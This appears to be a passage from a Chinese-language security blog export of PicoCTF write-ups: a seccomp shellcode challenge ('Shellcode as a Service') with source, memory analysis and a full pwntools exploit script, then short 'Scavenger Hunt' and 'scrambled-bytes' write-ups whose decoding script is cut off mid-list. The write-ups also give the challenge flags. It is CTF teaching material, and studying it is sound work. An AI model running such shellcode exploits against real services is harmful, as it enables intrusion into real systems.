#define HEADER \u0026#34;\\x48\\x31\\xc0\\x48\\x89\\xe7\\x48\\x81\\xe7\\x00\\xf0\\xff\\xff\\x48\\x81\\xef\\x00\\x20\\x00\\x00\\x48\\xc7\\xc1\\x00\\x06\\x00\\x00\\xf3\\x48\\xab\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xe4\\x48\\x31\\xed\\x48\\x31\\xf6\\x48\\x31\\xff\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\u0026#34; #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open(\u0026#34;flag.txt\u0026#34;, O_RDONLY)) == -1) error(EXIT_FAILURE, errno, \u0026#34;open flag\u0026#34;); if (read(fd, flag, FLAG_SIZE) == -1) error(EXIT_FAILURE, errno, \u0026#34;read flag\u0026#34;); if (close(fd) == -1) error(EXIT_FAILURE, errno, \u0026#34;close flag\u0026#34;); } void setup() { scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_KILL); int ret = 0; if (ctx != NULL) { ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO)); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); ret |= seccomp_load(ctx); } seccomp_release(ctx); if (ctx == NULL || ret) error(EXIT_FAILURE, 0, \u0026#34;seccomp\u0026#34;); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); load_flag(); puts(\u0026#34;Welcome to Shellcode as a Service!\u0026#34;); void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); memcpy(addr, HEADER, sizeof(HEADER)); read(0, addr + sizeof(HEADER) - 1, SIZE); setup(); goto *addr; } :::\nRecon # 這題算簡單，很適合新手打shell code，但不知道為啥很少人解，和之前計安的某一題很像但忘記在哪邊了，也有可能是在EOF的時候打的，關於seccomp可以看這篇1\n$ file chall chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0c0d78f23470e4613121a0d3bdc1cd5e43e49b32, not stripped $ checksec chall [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/SaaS/chall\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled $ seccomp-tools dump ./chall Welcome to Shellcode as a Service! 123 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013 0005: 0x15 0x06 0x00 0x0000003c if (A == exit) goto 0012 0006: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0012 0007: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0013 0008: 0x20 0x00 0x00 0x00000014 A = fd \u0026gt;\u0026gt; 32 # write(fd, buf, count) 0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013 0010: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count) 0011: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0013 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0013: 0x06 0x00 0x00 0x00000000 return KILL 觀察source code發現有設定seccomp的保護，只開放write和exit，但在輸入之前已經先讀了flag，此時就可以直接想辦法call syswrite把東西印出來就完事了 要注意libc的版本，我的local端原本是2.31但不知道為啥變成2.35，所以又花了一點時間用VM才解出來 這一題難的地方在於一開始有一串shell code(HEADER)，經過online tool2可以知道它就是把stack上和register的東西全部清空，所以如果要找到flag所在的位址就需要撈一下memory，我的做法是直接把memory dump下來，然後string search(記得是little endian)，然後用offset算他和rip之間的相對位置 Exploit - seccomp-tools / syswrite # 算offset是這一題最煩的地方，以我的例子來說(記憶體區段如下)，flag是放在==0x000055e109602060==的地方，我執行shell code的地方是在==0x7fbb78c21000==，所以我先把0x00007f1d391e5000~0x00007f1d39215000的東西dump下來，發現在0x2e590的地方存的是==0x55e109400448==，和原本的0x000055e109602060差了一點，所以我先把後1.5bytes變成0(and operator)，然後加上offset(0x202060)，在依序把其他必要的register擺好就可以call function了 :::spoiler\n0x000055e109400000 0x000055e109402000 0x0000000000000000 r-x /home/sbk/Downloads/SaaS/chall 0x000055e109601000 0x000055e109602000 0x0000000000001000 r-- /home/sbk/Downloads/SaaS/chall 0x000055e109602000 0x000055e109603000 0x0000000000002000 rw- /home/sbk/Downloads/SaaS/chall 0x00007fbb789cb000 0x00007fbb789ce000 0x0000000000000000 rw- 0x00007fbb789ce000 0x00007fbb789f0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007fbb789f0000 0x00007fbb78b68000 0x0000000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007fbb78b68000 0x00007fbb78bb6000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007fbb78bb6000 0x00007fbb78bba000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007fbb78bba000 0x00007fbb78bbc000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007fbb78bbc000 0x00007fbb78bc0000 0x0000000000000000 rw- 0x00007fbb78bc0000 0x00007fbb78bc2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78bc2000 0x00007fbb78bd1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78bd1000 0x00007fbb78bdf000 0x0000000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78bdf000 0x00007fbb78be0000 0x000000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78be0000 0x00007fbb78be1000 0x000000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78be1000 0x00007fbb78be2000 0x0000000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x00007fbb78be2000 0x00007fbb78be4000 0x0000000000000000 rw- 0x00007fbb78bf5000 0x00007fbb78bf6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007fbb78bf6000 0x00007fbb78c19000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007fbb78c19000 0x00007fbb78c21000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007fbb78c21000 0x00007fbb78c22000 0x0000000000000000 rwx 0x00007fbb78c22000 0x00007fbb78c23000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007fbb78c23000 0x00007fbb78c24000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x00007fbb78c24000 0x00007fbb78c25000 0x0000000000000000 rw- 0x00007ffe014db000 0x00007ffe014fd000 0x0000000000000000 rw- [stack] 0x00007ffe0150d000 0x00007ffe01511000 0x0000000000000000 r-- [vvar] 0x00007ffe01511000 0x00007ffe01513000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall] :::\nfrom pwn import * # r = process(\u0026#39;./chall\u0026#39;) r = remote(\u0026#39;mars.picoctf.net\u0026#39;, 31021) context.arch = \u0026#39;amd64\u0026#39; r.recvline() # exe = ELF(\u0026#39;./chall\u0026#39;) payload = asm(\u0026#39;\u0026#39;\u0026#39; lea rax, [rip-0x52-0x2c000+0x2e9f0] mov rsi, QWORD PTR [rax] and rsi, 0xfffffffffffff000 add rsi, 0x202060 mov rdi, 1 mov rdx, 0x40 mov rax, 1 syscall \u0026#39;\u0026#39;\u0026#39;) # raw_input() r.sendline(payload) r.interactive() $ python exp.py [+] Opening connection to mars.picoctf.net on port 31021: Done [*] Switching to interactive mode picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g} \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Got EOF while reading in interactive Flag: picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}\nReference # Simple PWN - 0x010(seccomp/Lab - rop2win)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nOnline x86 / x64 Assembler and Disassembler\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":308,"href":"/security/practice/picoctf/web/picoctf---scavenger-hunt/","title":"PicoCTF - Scavenger Hunt","section":"Securities","content":" PicoCTF - Scavenger Hunt # tags: PicoCTF CTF Web # Challenge: Scavenger Hunt\nBackground # .htaccess 使用技巧彙整\n.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。 概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。 .htaccess 詳解\nExploit - Insp3ct0r + htaccess + DS_Store # HTML + CSS +JS These files keeps one fragment flag each. Especially js file\u0026rsquo;s hint: /* How can I keep Google from indexing my website? */ Apache server $\\to$ .htaccess file Mac computer $\\to$ .DS_Store file Combine the fragment picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_74cceb07} Reference # Scavenger Hunt write up\n"},{"id":309,"href":"/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/","title":"PicoCTF - scrambled-bytes","section":"Securities","content":" PicoCTF - scrambled-bytes # Background # 盤點一款 Python 發包收包利器 - scapy\n只發不收 # send(pkt, inter=0, loop=0, count=1, iface=N) pkt:數據包 inter：發包間隔時間 count：發包數量 iface：網卡接口名稱 send()，在第三層發包，沒有接收功能；send(IP(dst=\u0026#34;www.baidu.com\u0026#34;,ttl=2)/ICMP()) sendp()，在第二層發包，沒有接收功能。sr(Ether()/IP(dst=\u0026#34;www.baidu.com\u0026#34;)) time-時間的訪問和轉換 python 的pyshark庫如何使用 PyShark入門(2)：FileCapture和LiveCapture模塊\nSource code # :::spoiler Source Code\n#!/usr/bin/env python3 import argparse from progress.bar import IncrementalBar from scapy.all import * import ipaddress import random from time import time def check_ip(ip): try: return ipaddress.ip_address(ip) except: raise argparse.ArgumentTypeError(f\u0026#39;{ip} is an invalid address\u0026#39;) def check_port(port): try: port = int(port) if port \u0026lt; 1 or port \u0026gt; 65535: raise ValueError return port except: raise argparse.ArgumentTypeError(f\u0026#39;{port} is an invalid port\u0026#39;) def main(args): with open(args.input, \u0026#39;rb\u0026#39;) as f: payload = bytearray(f.read()) random.seed(int(time())) random.shuffle(payload) with IncrementalBar(\u0026#39;Sending\u0026#39;, max=len(payload)) as bar: for b in payload: send( IP(dst=str(args.destination)) / UDP(sport=random.randrange(65536), dport=args.port) / Raw(load=bytes([b^random.randrange(256)])), verbose=False) bar.next() if __name__==\u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser() parser.add_argument(\u0026#39;destination\u0026#39;, help=\u0026#39;destination IP address\u0026#39;, type=check_ip) parser.add_argument(\u0026#39;port\u0026#39;, help=\u0026#39;destination port number\u0026#39;, type=check_port) parser.add_argument(\u0026#39;input\u0026#39;, help=\u0026#39;input file\u0026#39;) main(parser.parse_args()) :::\nRecon # 這一題真的沒必要出的那麼複雜，有點硬要的感覺，不喜歡\u0026hellip;，不看1我已經猜到八成了，但我感受到一股惡意\u0026hellip;\nRecon pcapng \u0026amp; Source Code 一開始我先做基本的packet的recon，然後沒啥發現，他的description寫說: I sent my secret flag over the wires, but the bytes got all mixed up! 代表他應該是傳了一些東西，然後把network flow記錄下來，可以看一下source code也的確是這樣，但標題和內文就有提示，說明他有打亂要transfer的東西，不過因為我不知道實際執行這支程式後，wireshark到底會錄到怎麼樣的東西，應該說形式上到底長怎樣，所以為了確定就直接reproduce一下\nReproduce the outcome Q1: 先說，如果用wsl的環境下command，但會出現以下error\n$ python send.py 192.168.137.2 8888 test_flag.txt Sending | | 0/22 Traceback (most recent call last): File \u0026#34;send.py\u0026#34;, line 46, in \u0026lt;module\u0026gt; main(parser.parse_args()) File \u0026#34;send.py\u0026#34;, line 34, in main send( File \u0026#34;/home/sbk6401/.local/lib/python3.8/site-packages/scapy/sendrecv.py\u0026#34;, line 445, in send return _send( File \u0026#34;/home/sbk6401/.local/lib/python3.8/site-packages/scapy/sendrecv.py\u0026#34;, line 414, in _send socket = socket or _func(iface)(iface=iface, **kargs) File \u0026#34;/home/sbk6401/.local/lib/python3.8/site-packages/scapy/arch/linux.py\u0026#34;, line 484, in __init__ self.ins = socket.socket( File \u0026#34;/home/sbk6401/anaconda3/envs/CTF/lib/python3.8/socket.py\u0026#34;, line 231, in __init__ _socket.socket.__init__(self, family, type, proto, fileno) PermissionError: [Errno 1] Operation not permitted 根據2的說明，應該是沒有用sudo，但如果用sudo又會出現no module named scapy或是no module named progress的問題，解決方式就是直接進入root然後安裝這兩個library，如果沒有進入root然後看pip list其實會看到這兩個library我之前就裝過了，但root好像不是找一般放library的地方\n$ sudo su # pip install scapy; pip install progress # exit Q2: 另外一個問題可能會是如3提到的，因為unix系統的換行和一般的windows不一樣，所以要轉換一下\n以上問題都解決之後，就可以利用wireshark抓一下中間過程會有甚麼特別的東西，首先我傳送的test_flag.txt的內容是picoCTF{test_12345678}，總共要傳送22個bytes，可以看到的確他一次是傳送一個bytes，然後是用UDP傳送，destination IP也是我們指定的192.168.137.2，但是會發現他每一個packet所帶的data，都和我們的flag沒有任何關聯，再回去看一下他在傳送前做了哪些事情，首先他在31行做了shuffle，然後在傳送前和產生的random number進行XOR，所以才會看起來都不一樣 Extract Data 到這邊我們就成功一半了，接著就是把data dump下來進行還原就好(開始感受痛苦吧!一袋米要扛幾樓)，我們把data印出來後就可以直接拿來用\nimport pyshark capture = pyshark.FileCapture(\u0026#39;./capture.pcapng\u0026#39;, display_filter=\u0026#39;udp and ip.dst == 172.17.0.3 and !icmp\u0026#39;) data = [] for pkt in capture: try: data.append(pkt.data.data) except: pass print(data) ==陷阱一== 如果觀察data的length會發現他只有==1990==，但是用wireshark卻filter出==1992==，仔細看會發現有兩個data是unknown(No.1943那個不算) 他應該是抓不到No. 4777的0x23和No.10562的0x0f，所以要手動把這兩個數值插入我們的list中 Recover input.txt 首先他有先利用time()的epoch當作random的seed，所以我是先看第一個傳送的packet他的時間是==1614044650==，當作他的seed，接下來只要有關random的操作都要和send.py一模一樣 由於我們還要考慮到他有事先進行shuffle，所以還要想辦法把順序調整回來，這邊我是參考1的方式，先建立一個大小為len(data)的list，再針對這個list進行shuffle，就可以得到一模一樣的順序，接著我們就把data和random所產出的東西做XOR就可以放回去到對應的index\n==陷阱二== 這邊就不是原作者的鍋，反而是參考的WP有問題，原本是想說可以直接試看看1寫的腳本，但怎麼樣都沒有像是圖片的byte code出現，幾經波折後才發現原來用他的腳本會在data list的最後多一個null element，這會導致len(data)不是1992而是1993，這樣shuffle的結果可想而知一定不一樣，我也回報給原作者了4，就看他要不要修 只要把最後的random byte $\\oplus$ data的結果寫回去到一個file，就會發現是一個png圖檔，那就是flag Exploit # from time import time import random # import pyshark # capture = pyshark.FileCapture(\u0026#39;./capture.pcapng\u0026#39;, display_filter=\u0026#39;udp and ip.dst == 172.17.0.3 and !icmp\u0026#39;) # data = [] # for pkt in capture: # try: # data.append(pkt.data.data) # except: # pass # print(data) data = [\u0026#39;3b\u0026#39;, \u0026#39;04\u0026#39;, \u0026#39;79\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;d2\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;b9\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;78\u0026#39;, \u0026#39;e5\u0026#39;, \u0026#39;5c\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;ac\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;63\u0026#39;, \u0026#39;04\u0026#39;, \u0026#39;bc\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;95\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;df\u0026#39;, \u0026#39;9c\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;67\u0026#39;, \u0026#39;f4\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;9d\u0026#39;, \u0026#39;5e\u0026#39;, \u0026#39;72\u0026#39;, \u0026#39;0d\u0026#39;, \u0026#39;ae\u0026#39;, \u0026#39;9a\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;be\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;6b\u0026#39;, \u0026#39;81\u0026#39;, \u0026#39;92\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;92\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;2b\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;fc\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;f8\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;72\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;f9\u0026#39;, \u0026#39;aa\u0026#39;, \u0026#39;b8\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;5e\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;4b\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;95\u0026#39;, \u0026#39;4f\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;9d\u0026#39;, \u0026#39;96\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;1c\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;1a\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;0a\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;3b\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;53\u0026#39;, \u0026#39;cf\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;a5\u0026#39;, \u0026#39;e5\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;b5\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;1a\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;b7\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;b5\u0026#39;, \u0026#39;92\u0026#39;, \u0026#39;63\u0026#39;, \u0026#39;0d\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;e7\u0026#39;, \u0026#39;3c\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;0b\u0026#39;, \u0026#39;89\u0026#39;, \u0026#39;6b\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;e8\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;9b\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;53\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;e4\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;5e\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;fd\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;e4\u0026#39;, \u0026#39;a9\u0026#39;, \u0026#39;02\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;01\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;9d\u0026#39;, \u0026#39;e5\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;a3\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;74\u0026#39;, \u0026#39;8a\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;e8\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;01\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;2a\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;e0\u0026#39;, \u0026#39;04\u0026#39;, \u0026#39;d0\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;a9\u0026#39;, \u0026#39;cb\u0026#39;, \u0026#39;17\u0026#39;, \u0026#39;ad\u0026#39;, \u0026#39;e2\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;ea\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;a7\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;07\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;4b\u0026#39;, \u0026#39;74\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;53\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;16\u0026#39;, \u0026#39;9a\u0026#39;, \u0026#39;2c\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;b3\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;77\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;84\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;f8\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;e1\u0026#39;, \u0026#39;1e\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;3c\u0026#39;, \u0026#39;d6\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;e6\u0026#39;, \u0026#39;b6\u0026#39;, \u0026#39;7f\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;a7\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;03\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;cf\u0026#39;, \u0026#39;2e\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;fc\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;ad\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;d7\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;0c\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;d3\u0026#39;, \u0026#39;e1\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;f4\u0026#39;, \u0026#39;9b\u0026#39;, \u0026#39;b5\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;89\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;96\u0026#39;, \u0026#39;60\u0026#39;, \u0026#39;e2\u0026#39;, \u0026#39;2d\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;e2\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;fd\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;a4\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;9a\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;09\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;b4\u0026#39;, \u0026#39;da\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;0c\u0026#39;, \u0026#39;d3\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;83\u0026#39;, \u0026#39;4a\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;78\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;84\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;ea\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;ef\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;c3\u0026#39;, \u0026#39;5c\u0026#39;, \u0026#39;79\u0026#39;, \u0026#39;6f\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;17\u0026#39;, \u0026#39;4d\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;bc\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;b6\u0026#39;, \u0026#39;3f\u0026#39;, \u0026#39;1c\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;b8\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;a1\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;9c\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;ec\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;9e\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;5a\u0026#39;, \u0026#39;89\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;0a\u0026#39;, \u0026#39;95\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;4f\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;7a\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;be\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;2c\u0026#39;, \u0026#39;4e\u0026#39;, 